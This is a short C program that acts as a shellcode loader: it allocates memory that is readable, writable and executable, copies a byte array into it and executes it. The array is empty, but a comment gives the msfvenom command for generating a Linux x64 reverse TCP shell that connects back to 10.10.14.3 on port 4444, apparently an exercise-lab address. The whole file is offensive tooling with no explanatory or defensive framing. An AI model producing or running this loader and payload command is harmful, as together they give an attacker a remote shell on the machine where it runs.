#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
  /* msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f c */
};

int main() {
  void *exec = mmap(0, sizeof(shellcode),
      PROT_READ | PROT_WRITE | PROT_EXEC,
      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  memcpy(exec, shellcode, sizeof(shellcode));
  ((void(*)())exec)();
}

